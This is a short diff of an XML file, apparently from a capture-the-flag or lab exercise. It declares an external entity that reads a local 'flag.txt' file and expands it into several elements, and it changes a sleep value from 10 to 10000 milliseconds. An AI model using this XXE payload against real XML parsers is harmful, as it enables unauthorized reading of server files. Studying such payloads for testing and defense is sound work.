@@ -3,7 +3,7 @@
 <!ENTITY otherFile SYSTEM "/home/ubuntu/xxe2/flag.txt">
 ]>
 <input>&otherFile;</input>
-<sleep milliseconds="10"/>
+<sleep milliseconds="10000"/>
 <doc>
   <foo>
     <bar>&otherFile;</bar>
